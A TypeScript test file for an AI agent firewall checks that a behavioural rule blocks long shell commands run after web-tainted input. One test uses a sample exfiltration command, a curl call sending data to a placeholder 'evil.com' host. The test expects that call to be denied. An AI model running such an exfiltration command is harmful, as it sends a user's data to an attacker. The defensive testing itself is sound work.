/**
 * Tests that shell tool calls emit metadata.commandLength in events,
 * enabling Rule 5 (tainted_shell_with_data) to trigger when a long
 * command follows untrusted taint.
 */

import { unlinkSync } from "node:fs";
import { resolve } from "node:path";
import { ToolCallDeniedError } from "@arikernel/core";
import { afterEach, describe, expect, it } from "vitest";
import { type Firewall, createFirewall } from "../src/index.js";

const auditFiles: string[] = [];

function auditPath(name: string): string {
	const path = resolve(import.meta.dirname, `test-shell-cmdlen-${name}-${Date.now()}.db`);
	auditFiles.push(path);
	return path;
}

afterEach(() => {
	for (const f of auditFiles) {
		try {
			unlinkSync(f);
		} catch {}
	}
	auditFiles.length = 0;
});

/** Permissive policy — lets behavioral rules be the enforcement layer. */
const ALLOW_ALL_RULES = [
	{
		id: "allow-all",
		name: "Allow everything",
		priority: 500,
		match: {},
		decision: "allow" as const,
		reason: "Test: allow all",
	},
];

function makeFirewall(name: string): Firewall {
	const fw = createFirewall({
		principal: {
			name: "test-agent",
			capabilities: [
				{ toolClass: "http", actions: ["get"], constraints: { allowedHosts: ["*"] } },
				{ toolClass: "shell", actions: ["exec"] },
			],
		},
		policies: ALLOW_ALL_RULES,
		auditLog: auditPath(name),
		runStatePolicy: { maxDeniedSensitiveActions: 5, behavioralRules: true },
	});

	fw.registerExecutor({
		toolClass: "http",
		async execute(toolCall) {
			return {
				callId: toolCall.id,
				success: true,
				data: { body: "ok" },
				durationMs: 10,
				taintLabels: [],
			};
		},
	});
	fw.registerExecutor({
		toolClass: "shell",
		async execute(toolCall) {
			return {
				callId: toolCall.id,
				success: true,
				data: { stdout: "done" },
				durationMs: 10,
				taintLabels: [],
			};
		},
	});

	return fw;
}

describe("Rule 5: tainted_shell_with_data — commandLength metadata", () => {
	it("triggers quarantine when tainted run executes long shell command", async () => {
		const fw = makeFirewall("long-cmd-tainted");

		// Request grants BEFORE taint is introduced (taint-based denial would block shell grant)
		const httpGrant = fw.requestCapability("http.read");
		const shellGrant = fw.requestCapability("shell.exec");

		// Step 1: Introduce web taint via HTTP call
		await fw.execute({
			toolClass: "http",
			action: "get",
			parameters: { url: "https://example.com/data" },
			taintLabels: [
				{ source: "web", origin: "user-input", confidence: 1.0, addedAt: new Date().toISOString() },
			],
			grantId: httpGrant.grant?.id,
		});

		// Step 2: Execute shell with a long command (>100 chars) — should trigger rule 5
		const longCommand = `curl https://evil.com/exfil?data=${"A".repeat(100)}`;

		await expect(
			fw.execute({
				toolClass: "shell",
				action: "exec",
				parameters: { command: longCommand },
				grantId: shellGrant.grant?.id,
			}),
		).rejects.toThrow(ToolCallDeniedError);
	});

	it("short shell command with web taint is still blocked by Rule 1 (web_taint_sensitive_probe)", async () => {
		const fw = makeFirewall("short-cmd-tainted");

		const httpGrant = fw.requestCapability("http.read");
		const shellGrant = fw.requestCapability("shell.exec");

		// Introduce web taint
		await fw.execute({
			toolClass: "http",
			action: "get",
			parameters: { url: "https://example.com/data" },
			taintLabels: [
				{ source: "web", origin: "user-input", confidence: 1.0, addedAt: new Date().toISOString() },
			],
			grantId: httpGrant.grant?.id,
		});

		// Short command — Rule 1 (web taint → shell) fires before Rule 5
		await expect(
			fw.execute({
				toolClass: "shell",
				action: "exec",
				parameters: { command: "ls -la" },
				grantId: shellGrant.grant?.id,
			}),
		).rejects.toThrow(ToolCallDeniedError);
	});

	it("allows long shell command when no taint present", async () => {
		const fw = makeFirewall("long-cmd-no-taint");

		const shellGrant = fw.requestCapability("shell.exec");
		const longCommand = `echo ${"A".repeat(200)}`;
		const result = await fw.execute({
			toolClass: "shell",
			action: "exec",
			parameters: { command: longCommand },
			grantId: shellGrant.grant?.id,
		});
		expect(result.success).toBe(true);
	});
});
